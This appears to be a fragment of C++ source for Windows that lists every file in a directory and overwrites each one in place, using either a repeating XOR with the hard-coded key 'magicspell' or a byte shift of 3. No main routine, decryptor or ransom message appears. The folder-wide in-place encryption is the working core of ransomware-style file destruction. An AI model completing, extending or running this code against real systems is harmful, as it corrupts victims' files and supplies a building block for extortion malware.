#include "kk5v.h"
#include <fstream>
#include <iostream>
#include <windows.h>  // Include Windows API headers

// Helper function to get all files in a directory
std::vector<std::string> getFilesInDirectory(const std::string& directory) {
    std::vector<std::string> files;
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile((directory + "\\*").c_str(), &findFileData);

    if (hFind == INVALID_HANDLE_VALUE)
        return files;

    do {
        // Skip directories like "." and ".."
        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            continue;

        files.push_back(directory + "\\" + findFileData.cFileName);
    } while (FindNextFile(hFind, &findFileData) != 0);

    FindClose(hFind);
    return files;
}

// XOR encryption function (using key: "magicspell")
void encryptFileXOR(const std::string& filePath) {
    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open()) {
        return;
    }

    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();

    // XOR encryption with key
    const std::string key = "magicspell";
    size_t keyLength = key.length();
    for (size_t i = 0; i < content.length(); ++i) {
        content[i] ^= key[i % keyLength];
    }

    // Write back encrypted content
    std::ofstream outFile(filePath, std::ios::binary);
    outFile.write(content.c_str(), content.size());
    outFile.close();
}

// Caesar cipher encryption (shift by 3)
void encryptFileCaesar(const std::string& filePath) {
    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open()) {
        return;
    }

    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();

    // Caesar cipher encryption with shift of 3
    for (char &c : content) {
        c += 3; // Shift ASCII value by 3
    }

    // Write back encrypted content
    std::ofstream outFile(filePath, std::ios::binary);
    outFile.write(content.c_str(), content.size());
    outFile.close();
}
